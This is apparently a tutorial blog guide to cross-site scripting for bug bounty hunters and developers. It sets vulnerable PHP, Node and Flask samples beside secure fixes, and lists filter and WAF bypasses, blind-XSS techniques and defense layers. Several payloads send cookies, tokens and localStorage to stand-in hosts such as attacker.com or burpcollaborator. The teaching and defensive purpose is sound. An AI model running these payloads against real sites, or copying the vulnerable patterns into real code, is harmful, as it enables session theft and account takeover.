---
title: "Cross-Site Scripting (XSS): The Complete Guide"
description: "Cross-Site Scripting (XSS) is one of the most prevalent and dangerous web application vulnerabilities. This guide provides complete coverage of all XSS types, from basic reflected XSS to advanced blind XSS techniques. Whether you're a bug bounty hunter looking for your next finding or a developer securing your application, this guide has everything you need."
categoryLabel: Web Security
published: 2026-03-01
updated: 2026-03-01
tags: [xss, web-security, bug-bounty, owasp]
authors:
  - name: Bhagirath Saxena
    initials: BS
    social: "@rix4uni"
---


## What is XSS?

Cross-Site Scripting (XSS) is a security vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. When an application includes untrusted data in its output without proper validation or escaping, an attacker can embed malicious JavaScript that executes in the victim's browser.

### Why XSS is Dangerous

- **Session Hijacking**: Steal user cookies and session tokens
- **Credential Theft**: Capture login credentials via fake forms
- **Defacement**: Modify page content visible to users
- **Malware Distribution**: Redirect users to malicious sites
- **Keylogging**: Record user keystrokes
- **CSRF Bypass**: Perform actions on behalf of the user

---

## Reflected XSS

### What is Reflected XSS?

Reflected XSS occurs when an application receives data in an HTTP request and includes that data in the immediate response without proper sanitization. The malicious script is "reflected" off the web server and executed in the victim's browser.

### How It Works

1. Attacker crafts a malicious URL containing the XSS payload
2. Victim clicks the malicious link (via email, chat, etc.)
3. Server reflects the payload back in the response
4. Browser executes the malicious script

### Vulnerable Code Example

```php:vulnerable

<?php
// Vulnerable search functionality
$search = $_GET['q'];
echo "<h1>Search results for: " . $search . "</h1>";
?>
```

**Exploitation URL:**
```
https://example.com/search?q=<script>alert(document.cookie)</script>
```

### Common Injection Points

| Location | Example Payload |
|----------|----------------|
| URL Parameters | `?search=<script>alert(1)</script>` |
| Form Fields | `<script>fetch('https://attacker.com/log?cookie='+document.cookie)</script>` |
| Headers | `X-Forwarded-For: <script>alert(1)</script>` |
| Fragment Identifier | `#<img src=x onerror=alert(1)>` |

### Bypass Techniques

#### Encoding Bypasses

```html

<!-- HTML Entity Encoding -->
&lt;script&gt;alert(1)&lt;/script&gt;

<!-- URL Encoding -->
%3Cscript%3Ealert(1)%3C%2Fscript%3E

<!-- Unicode Encoding -->
\u003Cscript\u003Ealert(1)\u003C/script\u003E
```

#### Filter Evasion

```html

<!-- Case Variation -->
<ScRiPt>alert(1)</ScRiPt>

<!-- Tag Breaking -->
<scr<script>ipt>alert(1)</scr</script>ipt>

<!-- Event Handlers -->
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<svg onload=alert(1)>

<!-- JavaScript Pseudo-Protocol -->
<a href="javascript:alert(1)">Click</a>

<!-- Data URI -->
<iframe src="data:text/html,<script>alert(1)</script>">
```

### Secure Code Example

```php:secure

<?php
// Secure search functionality
$search = $_GET['q'];
// Use htmlspecialchars to encode special characters
echo "<h1>Search results for: " . htmlspecialchars($search, ENT_QUOTES, 'UTF-8') . "</h1>";
?>
```

---

## Stored XSS

### What is Stored XSS?

Stored XSS (also called Persistent XSS) occurs when the application stores user input and later includes it in responses to other users. The malicious script is permanently stored in the database or storage system.

### How It Works

1. Attacker submits malicious payload to the application
2. Application stores the payload (in database, file, etc.)
3. Victim requests a page that includes the stored data
4. Server includes the malicious script in the response
5. Browser executes the script in the victim's context

### Common Targets

- User profile fields (bio, username, display name)
- Comment systems
- Forum posts
- Product reviews
- File uploads (if served with wrong content-type)
- Chat messages
- Admin panels

### Vulnerable Code Example

```javascript

:vulnerable

// Vulnerable comment system (Node.js/Express)
app.post('/comment', (req, res) => {
    const comment = req.body.comment;
    const username = req.body.username;
    
    // Directly storing user input without sanitization
    db.query('INSERT INTO comments (username, comment) VALUES (?, ?)', 
        [username, comment]);
    res.redirect('/comments');
});

app.get('/comments', (req, res) => {
    db.query('SELECT * FROM comments', (err, results) => {
        let html = '<h1>Comments</h1>';
        results.forEach(row => {
            // Vulnerable: directly outputting stored data
            html += `<div class="comment">
                <strong>${row.username}</strong>: ${row.comment}
            </div>`;
        });
        res.send(html);
    });
});
```

### Exploitation Example

```html

<!-- Stored XSS in username field -->
<script>
fetch('https://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie))
</script>

<!-- Image-based payload for WAF evasion -->
<img src="https://nonexistent.com" 
     onerror="fetch('https://attacker.com/steal?data='+localStorage.getItem('token'))">
```

### Advanced Stored XSS Techniques

#### Polyglot Payloads

A payload that works in multiple contexts:

```javascript

jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

#### Mutation XSS

Exploiting browser's parsing behavior:

```html

<noscript><p title="</noscript><img src=x onerror=alert(1)>"></p></noscript>
```

### Secure Code Example

```javascript

:secure

// Secure comment system (Node.js/Express)
const sanitizeHtml = require('sanitize-html');

app.post('/comment', (req, res) => {
    const comment = req.body.comment;
    const username = req.body.username;
    
    // Sanitize HTML content - allow only safe tags
    const cleanComment = sanitizeHtml(comment, {
        allowedTags: ['b', 'i', 'em', 'strong', 'a'],
        allowedAttributes: {
            'a': ['href']
        },
        allowedSchemes: ['http', 'https']
    });
    
    // Escape username (no HTML expected)
    const cleanUsername = username
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#x27;');
    
    db.query('INSERT INTO comments (username, comment) VALUES (?, ?)', 
        [cleanUsername, cleanComment]);
    res.redirect('/comments');
});
```

---

## DOM XSS

### What is DOM XSS?

DOM-based XSS occurs when the application's client-side JavaScript modifies the DOM using attacker-controllable data. The vulnerability exists entirely in client-side code, and the malicious payload never reaches the server.

### Sources and Sinks

**Sources** (where data comes from):
- `document.URL`
- `document.location.href`
- `document.location.pathname`
- `document.location.search`
- `window.location.hash`
- `document.referrer`
- `document.cookie`

**Sinks** (where data goes):
- `element.innerHTML`
- `element.outerHTML`
- `document.write()`
- `eval()`
- `setTimeout()` / `setInterval()`
- `location.href` / `location.replace()`

### Vulnerable Code Example

```javascript

:vulnerable

// Vulnerable hash-based routing
function handleRoute() {
    const hash = window.location.hash.substring(1);
    const page = hash.split('?')[0];
    
    // VULNERABLE: Using innerHTML with user-controlled data
    document.getElementById('content').innerHTML = `
        <h1>Page: ${decodeURIComponent(page)}</h1>
    `;
}

window.addEventListener('hashchange', handleRoute);
handleRoute();
```

### Exploitation

```
https://example.com/app#<img src=x onerror=alert(document.cookie)>
```

### Common DOM XSS Patterns

#### 1. jQuery Vulnerabilities

```javascript:vulnerable

// Vulnerable jQuery patterns
$('#output').html(location.hash.slice(1));

// Or using $() for element creation
var div = $('<div>' + location.hash.slice(1) + '</div>');
```

#### 2. Angular Template Injection

```javascript:vulnerable

// Angular expressions in user input
{{constructor.constructor('alert(1)')()}}
```

#### 3. React Dangerous Patterns

```jsx:vulnerable

// Vulnerable React code
function UserProfile({ userContent }) {
    return <div dangerouslySetInnerHTML={{ __html: userContent }} />;
}
```

### Secure Code Example

```javascript:secure

// Secure DOM manipulation
function handleRoute() {
    const hash = window.location.hash.substring(1);
    const page = hash.split('?')[0];
    
    // SECURE: Use textContent instead of innerHTML
    const content = document.getElementById('content');
    const h1 = document.createElement('h1');
    h1.textContent = 'Page: ' + decodeURIComponent(page);
    content.innerHTML = ''; // Clear existing
    content.appendChild(h1);
}

// Alternative: Use a safe URL parser
function getSafeHashParam(param) {
    const hash = window.location.hash.substring(1);
    const params = new URLSearchParams(hash.split('?')[1] || '');
    return params.get(param) || '';
}
```

---

## Blind XSS

### What is Blind XSS?

Blind XSS occurs when the injected payload is stored by the application but only executed in a context that the attacker cannot directly observe, such as:
- Admin panels
- Internal dashboards
- Log viewers
- Email reports
- Export functionality

### Why It's Dangerous

Blind XSS is particularly dangerous because:
- It affects high-privilege users (admins)
- It's harder to detect and report
- Can lead to complete application compromise
- Often has higher payouts in bug bounty programs

### Detection Techniques

#### 1. Out-of-Band Interaction

```html

<script>
fetch('https://your-oast-domain.burpcollaborator.net/?cookie=' + document.cookie);
</script>
```

#### 2. DNS Exfiltration

```javascript

<script>
const data = document.cookie;
const subdomain = btoa(data).replace(/=/g, '');
const img = new Image();
img.src = `https://${subdomain}.your-domain.com/ping`;
</script>
```

#### 3. Time-Based Detection

```javascript

<script>
// Delay execution to confirm execution
setTimeout(() => {
    fetch('https://your-oast-domain.com/executed');
}, 5000);
</script>
```

### Common Blind XSS Targets

| Target | Injection Point | Trigger Location |
|--------|----------------|------------------|
| Contact Forms | Name/Email/Message | Admin notification email |
| Feedback Systems | Comment field | Internal review dashboard |
| Log Viewers | User-Agent, Referer | Admin log viewer |
| Export Features | Filename, Data | Admin export download |
| Error Reports | Error message | Error tracking system |
| Analytics | Custom events | Analytics dashboard |

### Advanced Blind XSS Payloads

```html

<!-- DNS Exfiltration with encoding -->
<script>
function exfil(data) {
    const encoded = btoa(data).replace(/\+/g, '-').replace(/\//g, '_');
    new Image().src = 'https://' + encoded.substring(0, 63) + '.burpcollaborator.net';
}
exfil(document.domain + ' ' + document.cookie);
</script>

<!-- Fetch with credentials -->
<script>
fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({
        cookies: document.cookie,
        localStorage: localStorage,
        url: location.href
    })
});
</script>

<!-- WebSocket-based (for real-time) -->
<script>
const ws = new WebSocket('wss://attacker.com/ws');
ws.onopen = () => ws.send(JSON.stringify({
    page: location.href,
    cookies: document.cookie
}));
</script>
```

---

## Self XSS

### What is Self XSS?

Self XSS is when an attacker tricks a user into executing XSS against themselves. Unlike other XSS types, the attacker must convince the victim to manually execute the malicious code.

### Common Scenarios

1. **Browser Console**: "Copy-paste this code to hack your friend's account"
2. **Bookmarklets**: Malicious JavaScript disguised as useful tools
3. **Developer Tools**: Fake browser extensions or "performance hacks"
4. **User Scripts**: TamperMonkey/Greasemonkey scripts

### Why Companies Often Don't Reward Self XSS

- Requires significant user interaction
- User is essentially attacking themselves
- Hard to exploit at scale
- Social engineering component

### When Self XSS Can Be Escalated

Self XSS can become exploitable if combined with:
- **CSRF vulnerabilities**: XSS in one tab affects another
- **Session fixation**: Attacker can set predictable session
- **Clickjacking**: Force user to execute XSS unknowingly

```html

<!-- Clickjacking that triggers Self XSS -->
<iframe src="vulnerable-site.com/profile" 
        style="opacity:0;position:absolute;top:0;left:0;width:100%;height:100%">
</iframe>
<button style="position:absolute;z-index:100">Click for Free Prize!</button>
```

---

## XSS in Headers

### Header-Based XSS Vectors

HTTP headers can be sources of XSS when:
- Reflected in error pages
- Used in client-side JavaScript
- Displayed in debug interfaces

### Common Header Injection Points

| Header | Injection Vector | Common Mistake |
|--------|-----------------|----------------|
| User-Agent | Stored in logs | Logs displayed without sanitization |
| Referer | Error page reflection | Error pages include Referer |
| X-Forwarded-For | IP display | User-controlled IP displayed |
| Cookie | Debug pages | Cookie values shown in debug mode |
| Host | Virtual host routing | Used in generated links |

### Vulnerable Code Example

```python:vulnerable

# Flask error handler
@app.errorhandler(404)
def not_found(error):
    user_agent = request.headers.get('User-Agent', 'Unknown')
    # VULNERABLE: User-Agent reflected without escaping
    return f'''
    <h1>404 Not Found</h1>
    <p>The requested URL was not found.</p>
    <p>Your browser: {user_agent}</p>
    ''', 404
```

### Exploitation

```bash

curl -H "User-Agent: <script>alert(1)</script>" https://example.com/nonexistent
```

### Secure Code Example

```python:secure

from markupsafe import escape

@app.errorhandler(404)
def not_found(error):
    user_agent = request.headers.get('User-Agent', 'Unknown')
    # SECURE: Proper escaping
    return f'''
    <h1>404 Not Found</h1>
    <p>The requested URL was not found.</p>
    <p>Your browser: {escape(user_agent)}</p>
    ''', 404
```

---

## Bug Bounty Hunter's Guide

### Where to Look for XSS

#### 1. Input Reflection Points

- Search boxes
- Login error messages
- Registration forms
- Password reset flows
- Profile updates
- File uploads (filename reflection)
- API endpoints that reflect input

#### 2. Common Parameters to Test

```
?q=<payload>
?search=<payload>
?callback=<payload>
?jsonp=<payload>
?redirect=<payload>
?next=<payload>
?return=<payload>
?url=<payload>
```

#### 3. Hidden Injection Points

- HTTP headers (User-Agent, Referer, X-Forwarded-For)
- Cookie values
- POST body parameters
- JSON fields
- XML nodes
- GraphQL mutations

### Testing Methodology

#### Step 1: Discover Reflection Points

```bash

# Use tools to find reflection points
gau target.com | qsreplace 'KRAZEXSS' | ffuf -w - -u FUZZ -mr 'KRAZEXSS'
```

#### Step 2: Context Analysis

Determine the reflection context:

| Context | Test Payload | Indicators |
|---------|--------------|------------|
| HTML Body | `<b>test</b>` | Bold text renders |
| HTML Attribute | `" onmouseover="alert(1)` | Event handler executes |
| JavaScript | `';alert(1);//` | Script breaks and executes |
| URL | `javascript:alert(1)` | Protocol recognized |
| CSS | `</style><script>alert(1)</script>` | Style tag closes |

#### Step 3: Bypass Filters

Common filter bypasses:

```html

<!-- If <script> is filtered -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src=javascript:alert(1)>

<!-- If event handlers are filtered -->
<a href="javascript:alert(1)">click</a>
<form action="javascript:alert(1)"><button>click</button></form>

<!-- If quotes are filtered -->
<img src=x onerror=alert&#40;1&#41;>
<script>alert/*foo*/(1)</script>
```

### WAF Bypass Techniques

```javascript

// Case variation
<ScRiPt>alert(1)</ScRiPt>

// Tag breaking (if "script" is blocked)
<scr<script>ipt>alert(1)</scr</script>ipt>

// Double encoding
%253Cscript%253Ealert(1)%253C%252Fscript%253E

// Null bytes (older PHP versions)
<s%00cript>alert(1)</s%00cript>

// Unicode normalization
<script>alert(1)</script>

// Template literals
<script>alert`1`</script>

// Eval alternatives
<script>eval(atob('YWxlcnQoMSk='))</script>
```

### Automation Tips

```bash

# Using dalfox for automated detection
dalfox url https://example.com/search?q=TEST

# Using XSStrike
python xsstrike.py -u "https://example.com/search?q=test"

# Using GF patterns
cat urls.txt | gf xss | dalfox pipe
```

---

## Developer's Defense Guide

### Defense-in-Depth Strategy

#### Layer 1: Input Validation

```python

import re
from typing import Optional

def validate_username(username: str) -> Optional[str]:
    """Validate username - alphanumeric only"""
    if not re.match(r'^[a-zA-Z0-9_]{3,30}$', username):
        return None
    return username

def sanitize_search(query: str) -> str:
    """Remove potential XSS vectors from search"""
    # Only allow alphanumeric and spaces
    return re.sub(r'[^a-zA-Z0-9\s]', '', query)
```

#### Layer 2: Output Encoding

```python

from html import escape
from markupsafe import Markup

def render_user_content(user_input: str) -> str:
    """Always escape user input when rendering in HTML"""
    # Escape HTML entities
    escaped = escape(user_input, quote=True)
    return Markup(f'<div class="user-content">{escaped}</div>')
```

#### Layer 3: Content Security Policy

```http
Content-Security-Policy: 
    default-src 'self';
    script-src 'self' 'nonce-{random}';
    style-src 'self' 'unsafe-inline';
    img-src 'self' data: https:;
    connect-src 'self';
    font-src 'self';
    object-src 'none';
    media-src 'self';
    frame-src 'none';
    base-uri 'self';
    form-action 'self';
    upgrade-insecure-requests;
```

#### Layer 4: HttpOnly and Secure Cookies

```http
Set-Cookie: sessionid={token}; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=3600
```

### Secure Coding Patterns by Language

#### PHP

```php:secure

<?php
// Always use htmlspecialchars before output
echo htmlspecialchars($userInput, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');

// Or use a template engine with auto-escaping
$twig = new \Twig\Environment($loader, [
    'autoescape' => 'html',
]);

// For JSON output
header('Content-Type: application/json');
echo json_encode($data, JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT);
?>
```

#### Node.js/Express

```javascript:secure

const escapeHtml = require('escape-html');
const createDOMPurify = require('dompurify');
const { JSDOM } = require('jsdom');

const window = new JSDOM('').window;
const DOMPurify = createDOMPurify(window);

// Escape for HTML context
app.get('/user', (req, res) => {
    const username = escapeHtml(req.query.name);
    res.send(`<h1>Hello ${username}</h1>`);
});

// Sanitize HTML content
app.post('/comment', (req, res) => {
    const clean = DOMPurify.sanitize(req.body.html, {
        ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p'],
        ALLOWED_ATTR: ['href', 'title']
    });
    // Store clean HTML
});
```

#### Python/Flask

```python:secure

from markupsafe import escape
from flask import Flask, render_template_string

app = Flask(__name__)

@app.route('/greet')
def greet():
    name = request.args.get('name', 'Guest')
    # Escape automatically with template engine
    return render_template_string(
        '<h1>Hello {{ name }}</h1>',
        name=name  # Jinja2 auto-escapes by default
    )

# Or explicitly escape
@app.route('/api')
def api():
    user_input = request.args.get('data', '')
    return {'message': escape(user_input)}
```

### Testing Your Defenses

```bash

# Automated XSS scanning
npm install -g semgrep
semgrep --config=p/xss .

# Manual testing checklist
echo "[ ] Test all input fields with <script>alert(1)</script>"
echo "[ ] Test URL parameters with javascript:alert(1)"
echo "[ ] Verify CSP headers are present"
echo "[ ] Check HttpOnly flag on cookies"
echo "[ ] Test with various encodings"
echo "[ ] Verify template auto-escaping is enabled"
echo "[ ] Check DOM manipulation in JavaScript"
```

---

## Tools & Resources

### Detection Tools

| Tool | Purpose | URL |
|------|---------|-----|
| Dalfox | Modern XSS scanner | https://github.com/hahwul/dalfox |
| XSStrike | Advanced XSS detection | https://github.com/s0md3v/XSStrike |
| XSSer | Automated XSS tester | https://github.com/epsylon/xsser |
| Burp Suite | Web vulnerability scanner | https://portswigger.net/burp |
| OWASP ZAP | Open source web scanner | https://www.zaproxy.org/ |

### Exploitation Frameworks

- **BeEF** (Browser Exploitation Framework): https://github.com/beefproject/beef
- **XSS Hunter**: https://xsshunter.com/
- **Collaborator**: Burp's out-of-band interaction tool

### Learning Resources

- **OWASP XSS Prevention Cheat Sheet**: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- **PortSwigger XSS Labs**: https://portswigger.net/web-security/cross-site-scripting
- **HTML5 Security Cheat Sheet**: https://html5sec.org/
- **Google XSS Game**: https://xss-game.appspot.com/

### Practice Labs

- **WebGoat**: Intentionally vulnerable application
- **DVWA**: Damn Vulnerable Web Application
- **TryHackMe XSS Rooms**: Guided XSS learning
- **HackTheBox XSS Challenges**: Real-world scenarios

---

## Conclusion

XSS remains a critical vulnerability class that affects applications of all sizes. Understanding the different types—Reflected, Stored, DOM, Blind, and Self XSS—is essential for both attackers (bug bounty hunters) and defenders (developers).

Key takeaways:

1. **For Bug Bounty Hunters**: Focus on hidden injection points, test all user-controlled data including headers, and use blind XSS techniques for admin panels.

2. **For Developers**: Implement defense-in-depth with input validation, output encoding, CSP headers, and HttpOnly cookies. Never trust user input.

3. **For Everyone**: XSS is preventable with proper security practices. Keep learning, keep testing, and help make the web more secure.

---

*This guide is a living document. Security evolves constantly, and new bypass techniques emerge regularly. Stay updated, practice on labs, and contribute to the security community.*

**Found this guide helpful?** Share it with your team and contribute your knowledge back to the community. If you find bugs using techniques from this guide, consider responsible disclosure.

---

*Published by KrazePlanet Security Research. For educational purposes only.*
